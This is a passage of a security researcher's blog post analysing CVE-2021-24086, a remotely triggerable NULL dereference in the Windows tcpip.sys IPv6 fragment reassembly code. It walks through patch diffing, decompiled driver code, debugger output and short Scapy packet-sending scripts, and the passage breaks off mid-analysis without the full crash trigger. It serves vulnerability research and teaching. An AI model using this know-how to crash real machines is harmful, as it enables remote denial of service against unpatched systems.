Title: Reverse-engineering tcpip.sys: mechanics of a packet of the death (CVE-2021-24086)
Date: 2021-04-15 08:00
Tags: tcpip.sys, CVE-2021-24086, Ipv6pReassembleDatagram, fragmentation, recursive-fragmentation
Authors: Axel "0vercl0k" Souchet

# Introduction

Since the beginning of my journey in computer security I have always been amazed and fascinated by *true* remote vulnerabilities. By *true* remotes, I mean bugs that are triggerable remotely without any user interaction. Not even a single click. As a result  I am always on the lookout for such vulnerabilities.

On the Tuesday 13th of October 2020, Microsoft released a [patch](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-16898) for 
CVE-2020-16898 which is a vulnerability affecting Windows' `tcpip.sys` kernel-mode driver dubbed *Bad neighbor*. Here is the description from Microsoft:

```text
A remote code execution vulnerability exists when the Windows TCP/IP stack improperly
handles ICMPv6 Router Advertisement packets. An attacker who successfully exploited this vulnerability could gain
the ability to execute code on the target server or client. To exploit this vulnerability, an attacker would have
to send specially crafted ICMPv6 Router Advertisement packets to a remote Windows computer.
The update addresses the vulnerability by correcting how the Windows TCP/IP stack handles ICMPv6 Router Advertisement
packets.
```

The vulnerability really did stand out to me: remote vulnerabilities affecting TCP/IP stacks seemed extinct and being able to remotely trigger a memory corruption in the Windows kernel is very interesting for an attacker. Fascinating.

Hadn't diffed Microsoft patches in years I figured it would be a fun exercise to go through. I knew that I wouldn't be the only one working on it as those unicorns get a lot of attention from internet hackers. Indeed, my friend [pi3](http://blog.pi3.com.pl/?p=780) was so fast to diff the patch, write a PoC and write a blogpost that I didn't even have time to start, oh well :)

That is why when Microsoft [blogged](https://msrc-blog.microsoft.com/2021/02/09/multiple-security-updates-affecting-tcp-ip/) about another set of vulnerabilities being fixed in `tcpip.sys` I figured I might be able to work on those this time. Again, I knew for a fact that I wouldn't be the only one racing to write the first public PoC for CVE-2021-24086 but somehow the internet stayed silent long enough for me to complete this task which is very surprising :)

In this blogpost I will take you on my journey from zero to BSoD. From diffing the patches, reverse-engineering `tcpip.sys` and fighting our way through writing a PoC for `CVE-2021-24086`. If you came here for the code, fair enough, it is available on my [github](https://github.com/0vercl0k): [0vercl0k/CVE-2021-24086](https://github.com/0vercl0k/CVE-2021-24086).

[TOC]

# TL;DR

For the readers that want to get the scoop, CVE-2021-24086 is a NULL dereference in `tcpip!Ipv6pReassembleDatagram` that can be triggered remotely by sending a series of specially crafted packets. The issue happens because of the way the code treats the network buffer:

```C
void Ipv6pReassembleDatagram(Packet_t *Packet, Reassembly_t *Reassembly, char OldIrql)
{
  // ...
  const uint32_t UnfragmentableLength = Reassembly->UnfragmentableLength;
  const uint32_t TotalLength = UnfragmentableLength + Reassembly->DataLength;
  const uint32_t HeaderAndOptionsLength = UnfragmentableLength + sizeof(ipv6_header_t);
  // …
  NetBufferList = (_NET_BUFFER_LIST *)NetioAllocateAndReferenceNetBufferAndNetBufferList(
                                        IppReassemblyNetBufferListsComplete,
                                        Reassembly,
                                        0,
                                        0,
                                        0,
                                        0);
  if ( !NetBufferList )
  {
    // ...
    goto Bail_0;
  }

  FirstNetBuffer = NetBufferList->FirstNetBuffer;
  if ( NetioRetreatNetBuffer(FirstNetBuffer, uint16_t(HeaderAndOptionsLength), 0) < 0 )
  {
    // ...
    goto Bail_1;
  }

  Buffer = (ipv6_header_t *)NdisGetDataBuffer(FirstNetBuffer, HeaderAndOptionsLength, 0i64, 1u, 0);
  //...
  *Buffer = Reassembly->Ipv6;
```

A fresh NetBufferList (abbreviated NBL) is allocated by `NetioAllocateAndReferenceNetBufferAndNetBufferList` and `NetioRetreatNetBuffer` allocates a Memory Descriptor List (abbreviated MDL) of `uint16_t(HeaderAndOptionsLength)` bytes. This integer truncation from `uint32_t` is important.

Once the network buffer has been allocated, `NdisGetDataBuffer` is called to gain access to a contiguous block of data from the fresh network buffer. This time though, `HeaderAndOptionsLength` is not truncated which allows an attacker to trigger a special condition in `NdisGetDataBuffer` to make it fail. This condition is hit when `uint16_t(HeaderAndOptionsLength) != HeaderAndOptionsLength`. When the function fails, it returns NULL and `Ipv6pReassembleDatagram` blindly trusts this pointer and does a memory write, bugchecking the machine. To pull this off, you need to trick the network stack into receiving an IPv6 fragment with a very large amount of headers. Here is what the bugchecks look like:

<center>![trigger](/images/reverse_engineering_tcpip/trigger.gif)</center>

```text
KDTARGET: Refreshing KD connection

*** Fatal System Error: 0x000000d1
                       (0x0000000000000000,0x0000000000000002,0x0000000000000001,0xFFFFF8054A5CDEBB)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff805`473c46a0 cc              int     3

kd> kc
 # Call Site
00 nt!DbgBreakPointWithStatus
01 nt!KiBugCheckDebugBreak
02 nt!KeBugCheck2
03 nt!KeBugCheckEx
04 nt!KiBugCheckDispatch
05 nt!KiPageFault
06 tcpip!Ipv6pReassembleDatagram
07 tcpip!Ipv6pReceiveFragment
08 tcpip!Ipv6pReceiveFragmentList
09 tcpip!IppReceiveHeaderBatch
0a tcpip!IppFlcReceivePacketsCore
0b tcpip!IpFlcReceivePackets
0c tcpip!FlpReceiveNonPreValidatedNetBufferListChain
0d tcpip!FlReceiveNetBufferListChainCalloutRoutine
0e nt!KeExpandKernelStackAndCalloutInternal
0f nt!KeExpandKernelStackAndCalloutEx
10 tcpip!FlReceiveNetBufferListChain
11 NDIS!ndisMIndicateNetBufferListsToOpen
12 NDIS!ndisMTopReceiveNetBufferLists
```

For anybody else in for a long ride, let's get to it :)

# Recon

Even though [Francisco Falcon](https://twitter.com/fdfalcon) already wrote a cool [blogpost](https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html) discussing his work on this case, I have decided to also write up mine; I'll try to cover aspects that are less or not covered in his post like `tcpip.sys` internals for example.

All right, let's start by the beginning: at this point I don't know anything about `tcpip.sys` and I don't know anything about the bugs getting patched. Microsoft's blogpost is helpful because it gives us a bunch of clues:

- There are three different vulnerabilities that seemed to involve fragmentation in IPv4 & IPv6,
- Two of them are rated as *Remote Code Execution* which means that they cause memory corruption somehow,
- One of them causes a DoS which means somehow it likely bugchecks the target. 

According to this [tweet](https://twitter.com/metr0/status/1359214923541192704) we also learn that those flaws have been internally found by Microsoft's own [@piazzt](https://twitter.com/piazzt) which is awesome.

Googling around also reveals a bunch more useful information due to the fact that it would seem that Microsoft privately shared with their partners PoCs via the [MAPP program](https://www.microsoft.com/en-us/msrc/mapp).

At this point I decided to focus on the DoS vulnerability (CVE-2021-2486) as a first step. I figured it might be easier to trigger and that I might be able to use the acquired knowledge for triggering it to understand better `tcpip.sys` and maybe work on the other ones if time and motivation allows.

The next logical step is to diff the patches to identify the fixes.

# Diffing Microsoft patches in 2021

I honestly can't remember the last time I diff'd Microsoft patches. Probably Windows XP / Windows 7 time to be honest. Since then, a lot has changed though. The security updates are now cumulative, which means that packages embed every fix known to date. You can grab packages directly from the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/home.aspx) which is handy. Last but not least, Windows Updates now use forward / reverse differentials; you can read [this](https://docs.microsoft.com/en-us/windows/deployment/update/psfxwhitepaper) to know more about what it means.

[Extracting and Diffing Windows Patches in 2020](https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html) is a great blog post that talks about how to unpack the patches off an update package and how to apply the differentials. The output of this work is basically the `tcpip.sys` binary before and after the update. If you don't feel like doing this yourself, I've uploaded the two binaries (as well as their respective public PDBs) that you can use to do the diffing yourself: [0vercl0k/CVE-2021-24086/binaries](https://github.com/0vercl0k/CVE-2021-24086/tree/main/binaries). Also, I have been made aware after publishing this post about the amazing [winbindex](https://winbindex.m417z.com/) website which indexes Windows binaries and lets you download them in a click. Here is the index available for [tcpip.sys](https://winbindex.m417z.com/?file=tcpip.sys) as an example.

Once we have the before and after binaries, a little dance with [IDA](https://www.hex-rays.com/products/ida/) and the good ol’ [BinDiff](https://www.zynamics.com/software.html) yields the below:

<center>![bindiff](/images/reverse_engineering_tcpip/bindiff0.png)</center>

There aren't a whole lot of changes to look at which is nice, and focusing on `Ipv6pReassembleDatagram` feels right. Microsoft's workaround mentioned disabling packet reassembly (`netsh int ipv6 set global reassemblylimit=0`) and this function seems to be reassembling datagrams; close enough right?

After looking at it for a little time, the patched binary introduced this new interesting looking basic block:

<center>![bindiff](/images/reverse_engineering_tcpip/bindiff1.png)</center>

It ends with what looks like a comparison with the `0xffff` integer and a conditional jump that either bails out or keeps going. This looks very interesting because some articles mentioned that the bug could be triggered with a packet containing a large amount of headers. Not that you should trust those types of news articles as they are usually not technically accurate and sensationalized, but there might be some truth to it. At this point, I felt pretty good about it and decided to stop diffing and start reverse-engineering. I assumed the issue would be some sort of integer overflow / truncation that would be easy to trigger based on the name of the function. We just need to send a big packet right?

# Reverse-engineering tcpip.sys

This is where the real journey and the usual emotional rollercoasters when studying vulnerabilities. I initially thought I would be done with this in a few days, or a week. Oh boy, I was wrong though.

## Baby steps

First thing I did was to prepare a lab environment. I installed a Windows 10 (target) and a Linux VM (attacker), set-up KDNet and kernel debugging to debug the target, installed [Wireshark](https://www.wireshark.org/) / [Scapy](https://github.com/secdev/scapy) (v2.4.4), created a virtual switch which the two VMs are sharing. And... finally loaded `tcpip.sys` in IDA. The module looked pretty big and complex at first sights - no big surprise there; it implements Windows IPv4 & IPv6 network stack after all. I started the adventure by focusing first on `Ipv6pReassembleDatagram`. Here is the piece of assembly code that we saw earlier in BinDiff and that looked interesting:

<center>![ida](/images/reverse_engineering_tcpip/ida0.png)</center>

Great, that's a start. Before going deep down the rabbit hole of reverse-engineering, I decided to try to hit the function and be able to debug it with WinDbg. As the function name suggests reassembly I wrote the following code and threw it against my target:

```python
from scapy.all import *

pkt = Ether() / IPv6(dst = 'ff02::1') / UDP() / ('a' * 0x1000)
sendp(fragment6(pkt, 500), iface = 'eth1')
```

This successfully triggers the breakpoint in WinDbg; neat:

```text
kd> g
Breakpoint 0 hit
tcpip!Ipv6pReassembleDatagram:
fffff802`2edcdd6c 4488442418      mov     byte ptr [rsp+18h],r8b

kd> kc
 # Call Site
00 tcpip!Ipv6pReassembleDatagram
01 tcpip!Ipv6pReceiveFragment
02 tcpip!Ipv6pReceiveFragmentList
03 tcpip!IppReceiveHeaderBatch
04 tcpip!IppFlcReceivePacketsCore
05 tcpip!IpFlcReceivePackets
06 tcpip!FlpReceiveNonPreValidatedNetBufferListChain
07 tcpip!FlReceiveNetBufferListChainCalloutRoutine
08 nt!KeExpandKernelStackAndCalloutInternal
09 nt!KeExpandKernelStackAndCalloutEx
0a tcpip!FlReceiveNetBufferListChain
```

We can even observe the fragmented packets in Wireshark which is also pretty cool:

<center>![wireshark](/images/reverse_engineering_tcpip/ws0.png)</center>

For those that are not familiar with packet fragmentation, it is a mechanism used to chop large packets (larger than the [Maximum Transmission Unit](https://en.wikipedia.org/wiki/Maximum_transmission_unit)) in smaller chunks to be able to be sent across network equipment. The receiving network stack has the burden to stitch them all together in a safe manner (winkwink).

All right, perfect. We have now what I consider a good enough research environment and we can start digging deep into the code. At this point, let's not focus on the vulnerability yet but instead try to understand how the code works, the type of arguments it receives, recover structures and the semantics of important fields, etc. Let's get our HexRays decompilation output pretty.

As you might imagine, this is the part that's the most time consuming. I use a mixture of bottom-up, top-down. Loads of experiments. Commenting the decompiled code as best as I can, challenging myself by asking questions, answering them, rinse & repeat.

## High level overview

Oftentimes, studying code / features in isolation in complex systems is not enough; it only takes you so far. Complex drivers like `tcpip.sys` are gigantic, carry a lot of state, and are hard to reason about, both in terms of execution and data flow. In this case, there is this sort of size integer, that seems to be related to something that got received and we want to set that to `0xffff`. Unfortunately, just focusing on `Ipv6pReassembleDatagram` and `Ipv6pReceiveFragment` was not enough for me to make significant progress. It was worth a try though but time to switch gears.

### Zooming out

All right, that's cool, our HexRays decompiled code is getting prettier and prettier; it feels rewarding. We have abused the *create new structure* feature to lift a bunch of structures. We guessed about the semantics of some of them but most are still unknown. So yeah, let's work smarter.

We know that `tcpip.sys` receives packets from the network; we don't know exactly how or where from but maybe we don't need to know that much. One of the first questions you might ask yourself is how the kernel stores network data? What structures does it use?

#### NET_BUFFER & NET_BUFFER_LIST

If you have some Windows kernel experience, you might be familiar with [NDIS](https://en.wikipedia.org/wiki/Network_Driver_Interface_Specification) and you might also have heard about some of the APIs and the structures it exposes to users. It is documented because third-parties can develop extensions and drivers to interact with the network stack at various points.

An important structure in this world is `NET_BUFFER`. This is what it looks like in WinDbg:

```text
kd> dt NDIS!_NET_BUFFER
NDIS!_NET_BUFFER
   +0x000 Next             : Ptr64 _NET_BUFFER
   +0x008 CurrentMdl       : Ptr64 _MDL
   +0x010 CurrentMdlOffset : Uint4B
   +0x018 DataLength       : Uint4B
   +0x018 stDataLength     : Uint8B
   +0x020 MdlChain         : Ptr64 _MDL
   +0x028 DataOffset       : Uint4B
   +0x000 Link             : _SLIST_HEADER
   +0x000 NetBufferHeader  : _NET_BUFFER_HEADER
   +0x030 ChecksumBias     : Uint2B
   +0x032 Reserved         : Uint2B
   +0x038 NdisPoolHandle   : Ptr64 Void
   +0x040 NdisReserved     : [2] Ptr64 Void
   +0x050 ProtocolReserved : [6] Ptr64 Void
   +0x080 MiniportReserved : [4] Ptr64 Void
   +0x0a0 DataPhysicalAddress : _LARGE_INTEGER
   +0x0a8 SharedMemoryInfo : Ptr64 _NET_BUFFER_SHARED_MEMORY
   +0x0a8 ScatterGatherList : Ptr64 _SCATTER_GATHER_LIST
```

It can look overwhelming but we don't need to understand every detail. What is important is that the network data are stored in a regular [MDL](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls). As MDLs, *NET_BUFFER* can be chained together which allows the kernel to store a large amount of data in a bunch of non-contiguous chunks of physical memory; virtual memory is the magic wand used to make the data look contiguous. For the readers that are not familiar with Windows kernel development, an MDL is a Windows kernel construct that allows users to map physical memory in a contiguous virtual memory region. Every MDL is actually followed by a list of `PFNs` (which don't need to be contiguous) that the Windows kernel is able to map in a contiguous virtual memory region; magic.

```text
kd> dt nt!_MDL
   +0x000 Next             : Ptr64 _MDL
   +0x008 Size             : Int2B
   +0x00a MdlFlags         : Int2B
   +0x00c AllocationProcessorNumber : Uint2B
   +0x00e Reserved         : Uint2B
   +0x010 Process          : Ptr64 _EPROCESS
   +0x018 MappedSystemVa   : Ptr64 Void
   +0x020 StartVa          : Ptr64 Void
   +0x028 ByteCount        : Uint4B
   +0x02c ByteOffset       : Uint4B
```

`NET_BUFFER_LIST` are basically a structure to keep track of a list of `NET_BUFFERs` as the name suggests:

```text
kd> dt NDIS!_NET_BUFFER_LIST
   +0x000 Next             : Ptr64 _NET_BUFFER_LIST
   +0x008 FirstNetBuffer   : Ptr64 _NET_BUFFER
   +0x000 Link             : _SLIST_HEADER
   +0x000 NetBufferListHeader : _NET_BUFFER_LIST_HEADER
   +0x010 Context          : Ptr64 _NET_BUFFER_LIST_CONTEXT
   +0x018 ParentNetBufferList : Ptr64 _NET_BUFFER_LIST
   +0x020 NdisPoolHandle   : Ptr64 Void
   +0x030 NdisReserved     : [2] Ptr64 Void
   +0x040 ProtocolReserved : [4] Ptr64 Void
   +0x060 MiniportReserved : [2] Ptr64 Void
   +0x070 Scratch          : Ptr64 Void
   +0x078 SourceHandle     : Ptr64 Void
   +0x080 NblFlags         : Uint4B
   +0x084 ChildRefCount    : Int4B
   +0x088 Flags            : Uint4B
   +0x08c Status           : Int4B
   +0x08c NdisReserved2    : Uint4B
   +0x090 NetBufferListInfo : [29] Ptr64 Void
```

Again, no need to understand every detail, thinking in concepts is good enough. On top of that, Microsoft makes our life easier by providing a very useful WinDbg extension called `ndiskd`. It exposes two functions to dump `NET_BUFFER` and `NET_BUFFER_LIST`: `!ndiskd.nb` and `!ndiskd.nbl` respectively. These are a big time saver because they'll take care of walking the various levels of indirection: list of `NET_BUFFERs` and chains of `MDLs`.

#### The mechanics of parsing an IPv6 packet

Now that we know where and how network data is stored, we can ask ourselves how IPv6 packet parsing works? I have very little knowledge about networking, but I know that there are various headers that need to be parsed differently and that they can chain together. The layer N tells you what you'll find next.

What I am about to describe is what I have figured out while reverse-engineering as well as what I have observed during debugging it through a bazillions of experiments. Full disclosure: I am no expert so take it with a grain of salt :)

The top level function of interest is `IppReceiveHeaderBatch`. The first thing it does is to invoke `IppReceiveHeadersHelper` on every packet that are in the list:

```c
if ( Packet )
{
    do
    {
        Next = Packet->Next;
        Packet->Next = 0;
        IppReceiveHeadersHelper(Packet, Protocol, ...);
        Packet = Next;
    }
    while ( Next );
}
```

`Packet_t` is an undocumented structure that is associated with received packets. A bunch of state is stored in this structure and figuring out the semantics of important fields is time consuming. `IppReceiveHeadersHelper`'s main role is to kick off the parsing machine. It parses the IPv6 (or IPv4) header of the packet and reads the `next_header` field. As I mentioned above, this field is very important because it indicates how to read the next layer of the packet. This value is kept in the `Packet` structure, and a bunch of functions reads and updates it during parsing.

```C
NetBufferList = Packet->NetBufferList;
HeaderSize = Protocol->HeaderSize;
FirstNetBuffer = NetBufferList->FirstNetBuffer;
CurrentMdl = FirstNetBuffer->CurrentMdl;
if ( (CurrentMdl->MdlFlags & 5) != 0 )
    Va = CurrentMdl->MappedSystemVa;
else
    Va = MmMapLockedPagesSpecifyCache(CurrentMdl, 0, MmCached, 0, 0, 0x40000000u);
IpHdr = (ipv6_header_t *)((char *)Va + FirstNetBuffer->CurrentMdlOffset);
if ( Protocol == (Protocol_t *)Ipv4Global )
{
    // ...
}
else
{
    Packet->NextHeader = IpHdr->next_header;
    Packet->NextHeaderPosition = offsetof(ipv6_header_t, next_header);
    SrcAddrOffset = offsetof(ipv6_header_t, src);
}
```

The function does a lot more; it initializes several `Packet_t` fields but let's ignore that for now to avoid getting overwhelmed by complexity. Once the function returns back in `IppReceiveHeaderBatch`, it extracts a demuxer off the `Protocol_t` structure and invokes a parsing callback if the `NextHeader` is a valid extension header. The `Protocol_t` structure holds an array of `Demuxer_t` (term used in the driver).

```C
struct Demuxer_t
{
  void (__fastcall *Parse)(Packet_t *);
  void *f0;
  void *f1;
  void *Size;
  void *f3;
  _BYTE IsExtensionHeader;
  _BYTE gap[23];
};

struct Protocol_t
{
  // ...
  Demuxer_t Demuxers[277];
};
```

`NextHeader` (populated earlier in `IppReceiveHeaderBatch`) is the value used to index into this array.

<center>![ida43](/images/reverse_engineering_tcpip/ida4.png)</center>

If the demuxer is handling an extension header, then a callback is invoked to parse the header properly. This happens in a loop until the parsing hits the first part of the packet that isn't a header in which case it handles the next packet.

```C
while ( ... )
{
    NetBufferList = RcvList->NetBufferList;
    IpProto = RcvList->NextHeader;
    if ( ... )
    {
        Demuxer = (Demuxer_t *)IpUdpEspDemux;
    }
    else
    {
        Demuxer = &Protocol->Demuxers[IpProto];
    }
    if ( !Demuxer->IsExtensionHeader )
        Demuxer = 0;
    if ( Demuxer )
        Demuxer->Parse(RcvList);
    else
        RcvList = RcvList->Next;
}
```

Makes sense - that's kinda how we would implement parsing of IPv6 packets as well right?

<center>![ida1](/images/reverse_engineering_tcpip/ida1.png)</center>

It is easy to dump the demuxers and their associated `NextHeader` / `Parse` values; these might come handy later.

```text
- nh = 0  -> Ipv6pReceiveHopByHopOptions
- nh = 43 -> Ipv6pReceiveRoutingHeader
- nh = 44 -> Ipv6pReceiveFragmentList
- nh = 60 -> Ipv6pReceiveDestinationOptions
```

Demuxer can expose a callback routine for parsing which I called `Parse`. The `Parse` method receives a `Packet` and it is free to update its state; for example to grab the `NextHeader` that is needed to know how to parse the next layer. This is what `Ipv6pReceiveFragmentList` looks like (`Ipv6FragmentDemux.Parse`):

<center>![ida1](/images/reverse_engineering_tcpip/ida2.png)</center>

It makes sure the next header is `IPPROTO_FRAGMENT` before going further. Again, makes sense.

#### The mechanics of IPv6 fragmentation

Now that we understand the overall flow a bit more, it is a good time to start thinking about fragmentation. We know we need to send fragmented packets to hit the code that was fixed by the update, which we know is important somehow. The function that parses fragments is `Ipv6pReceiveFragment` and it is hairy. Again, keeping track of fragments probably warrants that, so nothing unexpected here.

It's also the right time for us to read literature about how exactly IPv6 fragmentation works. Concepts have been useful until now, but at this point we need to understand the nitty-gritty details. I don't want to spend too much time on this as there is tons of content online discussing the subject so I'll just give you the fast version. To define a fragment, you need to add a fragmentation header which is called `IPv6ExtHdrFragment` in Scapy land:

```python
class IPv6ExtHdrFragment(_IPv6ExtHdr):
    name = "IPv6 Extension Header - Fragmentation header"
    fields_desc = [ByteEnumField("nh", 59, ipv6nh),
                   BitField("res1", 0, 8),
                   BitField("offset", 0, 13),
                   BitField("res2", 0, 2),
                   BitField("m", 0, 1),
                   IntField("id", None)]
    overload_fields = {IPv6: {"nh": 44}}
```

The most important fields for us are :

- `offset` which tells the start offset of where the data that follows this header should be placed in the reassembled packet
- the `m` bit that specifies whether or not this is the latest fragment. 

Note that the `offset` field is an amount of 8 bytes blocks; if you set it to 1, it means that your data will be at +8 bytes. If you set it to 2, they'll be at +16 bytes, etc.

Here is a small ghetto IPv6 fragmentation function I wrote to ensure I was understanding things properly. I enjoy learning through practice. (Scapy has [`fragment6`](https://github.com/secdev/scapy/blob/33a6a5c3db28cb3c6e64880cef18c672e9526260/scapy/layers/inet6.py#L1124)):

```python
def frag6(target, frag_id, bytes, nh, frag_size = 1008):
    '''Ghetto fragmentation.'''
    assert (frag_size % 8) == 0
    leftover = bytes
    offset = 0
    frags = []
    while len(leftover) > 0:
        chunk = leftover[: frag_size]
        leftover = leftover[len(chunk): ]
        last_pkt = len(leftover) == 0
        # 0 -> No more / 1 -> More
        m = 0 if last_pkt else 1
        assert offset < 8191
        pkt = Ether() \
            / IPv6(dst = target) \
            / IPv6ExtHdrFragment(m = m, nh = nh, id = frag_id, offset = offset) \
            / chunk

        offset += (len(chunk) // 8)
        frags.append(pkt)
    return frags
```

Easy enough. The other important aspect of fragmentation in [the literature](https://www.geeksforgeeks.org/ipv6-fragmentation-header/) is related to IPv6 headers and what is called the *unfragmentable* part of a packet. Here is how Microsoft describes the unfragmentable part: "This part consists of the IPv6 header, the Hop-by-Hop Options header, the Destination Options header for intermediate destinations, and the Routing header". It also is the part that precedes the fragmentation header. Obviously, if there is an unfragmentable part, there is a fragmentable part. Easy, the fragmentable part is what you are sending behind the fragmentation header. The reassembly process is the process of stitching together the unfragmentable part with the reassembled fragmentable part into one beautiful reassembled packet. Here is a diagram taken from [Understanding the IPv6 Header](https://www.microsoftpressstore.com/articles/article.aspx?p=2225063&seqNum=4) that sums it up pretty well:

<center>![msftpress](/images/reverse_engineering_tcpip/msftpress0.png)</center>

All of this theoretical information is very useful because we can now look for those details while we reverse-engineer. It is always easier to read code and try to match it against what it is supposed or expected to do.

## Theory vs practice: Ipv6pReceiveFragment

At this point, I felt I had accumulated enough new information and it was time for zooming back in into the target. We want to verify that reality works like the literature says it does and by doing we will improve our overall understanding. After studying this code for a while we start to understand the big lines. The function receives a `Packet` but as this structure is packet specific it is not enough to track the state required to reassemble a packet. This is why another important structure is used for that; I called it `Reassembly`.

The overall flow is basically broken up in three main parts; again no need for us to understand every single details, let's just understand it conceptually and what/how it tries to achieve its goals:

* 1 - Figure out if the received fragment is part of an already existing `Reassembly`. According to the literature, we know that network stacks should use the source address, the destination address as well as the fragmentation header's identifier to determine if the current packet is part of a group of fragments. In practice, the function `IppReassemblyHashKey` hashes those fields together and the resulting hash is used to index into a hash-table that stores `Reassembly` structures (`Ipv6pFragmentLookup`):

```C
int IppReassemblyHashKey(__int64 Iface, int Identification, __int64 Pkt)
{
  //...
  Protocol = *(_QWORD *)(Iface + 40);
  OffsetSrcIp = 12i64;
  AddressLength = *(unsigned __int16 *)(*(_QWORD *)(Protocol + 16) + 6i64);
  if ( Protocol != Ipv4Global )
    OffsetSrcIp = offsetof(ipv6_header_t, src);
  H = RtlCompute37Hash(
        g_37HashSeed,
        Pkt + OffsetSrcIp,
        AddressLength);
  OffsetDstIp = 16i64;
  if ( Protocol != Ipv4Global )
    OffsetDstIp = offsetof(ipv6_header_t, dst);
  H2 = RtlCompute37Hash(H, Pkt + OffsetDstIp, AddressLength);
  return RtlCompute37Hash(H2, &Identification, 4i64) | 0x80000000;
}

Reassembly_t* Ipv6pFragmentLookup(__int64 Iface, int Identification, ipv6_header_t *Pkt, KIRQL *OldIrql)
{
  // ...
  v5 = *(_QWORD *)Iface;
  Context.Signature = 0;
  HashKey = IppReassemblyHashKey(v5, Identification, (__int64)Pkt);
  *OldIrql = KeAcquireSpinLockRaiseToDpc(&Ipp6ReassemblyHashTableLock);
  *(_OWORD *)&Context.ChainHead = 0;
  for ( CurrentReassembly = (Reassembly_t *)RtlLookupEntryHashTable(&Ipp6ReassemblyHashTable, HashKey, &Context);
        ;
        CurrentReassembly = (Reassembly_t *)RtlGetNextEntryHashTable(&Ipp6ReassemblyHashTable, &Context) )
  {
    // If we have walked through all the entries in the hash-table,
    // then we can just bail.
    if ( !CurrentReassembly )
      return 0;
    // If the current entry matches our iface, pkt id, ip src/dst
    // then we found a match!
    if ( CurrentReassembly->Iface == Iface
      && CurrentReassembly->Identification == Identification
      && memcmp(&CurrentReassembly->Ipv6.src.u.Byte[0], &Pkt->src.u.Byte[0], 16) == 0
      && memcmp(&CurrentReassembly->Ipv6.dst.u.Byte[0], &Pkt->dst.u.Byte[0], 16) == 0 )
    {
      break;
    }
  }
  // ...
  return CurrentReassembly;
}
```

* 1.1 - If the fragment doesn't belong to any known group, it needs to be put in a newly created `Reassembly`. This is what `IppCreateInReassemblySet` does. It's worth noting that this is a point of interest for a reverse-engineer because this is where the `Reassembly` object gets allocated and constructed (in `IppCreateReassembly`). It means we can retrieve its size as well as some more information about some of the fields.

```C
Reassembly_t *IppCreateInReassemblySet(
    PKSPIN_LOCK SpinLock, void *Src, __int64 Iface, __int64 Identification, KIRQL NewIrql
)
{
  Reassembly_t *Reassembly = IppCreateReassembly(Src, Iface, Identification);
  if ( Reassembly )
  {
    IppInsertReassembly((__int64)SpinLock, Reassembly);
    KeAcquireSpinLockAtDpcLevel(&Reassembly->Lock);
    KeReleaseSpinLockFromDpcLevel(SpinLock);
  }
  else
  {
    KeReleaseSpinLock(SpinLock, NewIrql);
  }
  return Reassembly;
}
```

<center>![ida3](/images/reverse_engineering_tcpip/ida3.png)</center>

* 2 - Now that we have a `Reassembly` structure, the main function wants to figure out where the current fragment fits in the overall reassembled packet. The `Reassembly` keeps track of fragments using various lists. It uses a `ContiguousList` that chains fragments that will be contiguous in the reassembled packet. `IppReassemblyFindLocation` is the function that seems to implement the logic to figure out where the current fragment fits.

* 2.1 - If `IppReassemblyFindLocation` returns a pointer to the start of the `ContiguousList`, it means that the current packet is the first fragment. This is where the function extracts and keeps track of the unfragmentable part of the packet. It is kept in a pool buffer that is referenced in the `Reassembly` structure.

```C
if ( ReassemblyLocation == &Reassembly->ContiguousStartList )
{
  Reassembly->NextHeader = Fragment->nexthdr;
  UnfragmentableLength = LOWORD(Packet->NetworkLayerHeaderSize) - 48;
  Reassembly->UnfragmentableLength = UnfragmentableLength;
  if ( UnfragmentableLength )
  {
    UnfragmentableData = ExAllocatePoolWithTagPriority(
      (POOL_TYPE)512,
      UnfragmentableLength,
      'erPI',
      LowPoolPriority
    );
    Reassembly->UnfragmentableData = UnfragmentableData;
    if ( !UnfragmentableData )
    {
      // ...
      goto Bail_0;
    }
    // ...
    // Copy the unfragmentable part of the packet inside the pool
    // buffer that we have allocated.
    RtlCopyMdlToBuffer(
      FirstNetBuffer->MdlChain,
      FirstNetBuffer->DataOffset - Packet->NetworkLayerHeaderSize + 0x28,
      Reassembly->UnfragmentableData,
      Reassembly->UnfragmentableLength,
      v51);
    NextHeaderOffset = Packet->NextHeaderPosition;
  }
  Reassembly->NextHeaderOffset = NextHeaderOffset;
  *(_QWORD *)&Reassembly->Ipv6 = *(_QWORD *)Packet->Ipv6Hdr;
}
```

* 3 - The fragment is then added into the `Reassembly` as part of a group of fragments by `IppReassemblyInsertFragment`. On top of that, if we have received every fragment necessary to start a reassembly, the function `Ipv6pReassembleDatagram` is invoked. Remember this guy? This is the function that has been patched and that we hit earlier in the post. But this time, we understand how we got there.

At this stage we have an OK understanding of the data structures involved to keep track of groups of fragments and how/when reassembly gets kicked off. We've also commented and refined various structure fields that we lifted early in the process; this is very helpful because now we can understand the fix for the vulnerability:

```C
void Ipv6pReassembleDatagram(Packet_t *Packet, Reassembly_t *Reassembly, char OldIrql)
{
  //...
  UnfragmentableLength = Reassembly->UnfragmentableLength;
  TotalLength = UnfragmentableLength + Reassembly->DataLength;
  HeaderAndOptionsLength = UnfragmentableLength + sizeof(ipv6_header_t);
  // Below is the added code by the patch
  if ( TotalLength > 0xFFF ) {
      // Bail
  }
```

How cool is that? That's really rewarding. Putting in a bunch of work that may feel not that useful at the time, but eventually adds up, snow-balls and really moves the needle forward. It's just a slow process and you gotta get used to it; that's just how the sausage is made.

Let's not get ahead of ourselves though, the emotional rollercoaster is right around the corner :)

## Hiding in plain sight

All right - at this point I think we are done with zooming out and understanding the big picture. We understand the beast well enough to start getting back on this BSoD. After reading `Ipv6pReassembleDatagram` a few times I honestly couldn't figure out where the advertised crash could happen. Pretty frustrating. That is why I decided instead to use the debugger to modify `Reassembly->DataLength` and `UnfragmentableLength` at runtime to see if this could give me any hints. The first one didn't seem to do anything, but the second one bug-checked the machine with a NULL dereference, bingo that is looking good!

After carefully analyzing the crash I've started to realize that the potential issue has been hiding in plain sight in front of my eyes; here is the code:

```C
void Ipv6pReassembleDatagram(Packet_t *Packet, Reassembly_t *Reassembly, char OldIrql)
{
  // ...
  const uint32_t UnfragmentableLength = Reassembly->UnfragmentableLength;
  const uint32_t TotalLength = UnfragmentableLength + Reassembly->DataLength;
